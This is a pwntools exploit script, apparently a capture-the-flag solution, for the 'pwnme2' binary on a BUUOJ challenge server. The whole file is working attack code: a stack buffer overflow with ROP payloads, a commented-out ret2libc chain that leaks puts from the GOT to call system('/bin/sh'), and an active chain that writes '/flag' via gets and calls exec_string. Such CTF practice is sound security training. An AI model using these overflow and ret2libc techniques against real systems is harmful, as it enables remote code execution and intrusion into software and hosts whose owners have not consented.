from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.arch = 'i386'
context.terminal = ['tmux', 'splitw', '-h']

host = 'node4.buuoj.cn'
port = 29243
elfpath = './pwnme2'
libcpath = ''

if args.LOCAL:
    p = process([elfpath])
    # gdb.attach(p)
else:
    p = remote(host, port)
    
s = lambda content: p.send(content)
sl = lambda content: p.sendline(content)
r = lambda n: p.recv(n)
ru = lambda pattern: p.recvuntil(pattern)
rl = lambda: p.recvline()
ru7f = lambda: p.recvuntil(b'\x7f')
su = lambda x: p.success(x)
pio = lambda: p.interactive()

# start pwning
e = ELF(elfpath)

offset = 0x6c

# buu好像又是把文件给删了...那就get shell吧
param1 = 0xcafebabe
param2 = 0xabadf00d
param3 = 0xdeadbeef

# payload1 = b'a'*(offset+4)
# # payload1 += p32(e.sym['add_flag'])
# payload1 += p32(e.sym['add_home'])
# payload1 += p32(e.sym['main'])
# payload1 += p32(param3)
# # payload1 += p32(param1)
# # payload1 += p32(param2)

# ru(b'Please input:\n')
# sl(payload1)

# payload2 = b'a'*(offset + 4)
# payload2 += p32(e.sym['exec_string'])
# ru(b'Please input:\n')
# sl(payload2)


# 第二种方法：ret2libc getshell
# payload1 = b'a'*(offset + 4)
# payload1 += p32(e.plt['puts']) + p32(e.sym['main']) + p32(e.got['puts'])
# ru(b'Please input:\n')
# sl(payload1)
# rl()
# puts_addr = u32(r(4))
# libc = LibcSearcher('puts', puts_addr)
# system_addr = libc.dump('system') + puts_addr - libc.dump('puts')
# binsh_addr = libc.dump('str_bin_sh') + puts_addr - libc.dump('puts')
# payload2 = b'a'*(offset+4)
# payload2 += p32(system_addr) + p32(e.sym['main']) + p32(binsh_addr)
# ru(b'Please input:\n')
# sl(payload2)

# 第三种方法：也可以利用给的函数打印`/flag`的内容
payload1 = b'a'*(offset + 4)
payload1 += p32(e.plt['gets']) + p32(e.sym['exec_string']) + p32(0x0804a060)
ru(b'Please input:\n')
sl(payload1)
sl(b'/flag')

pio()

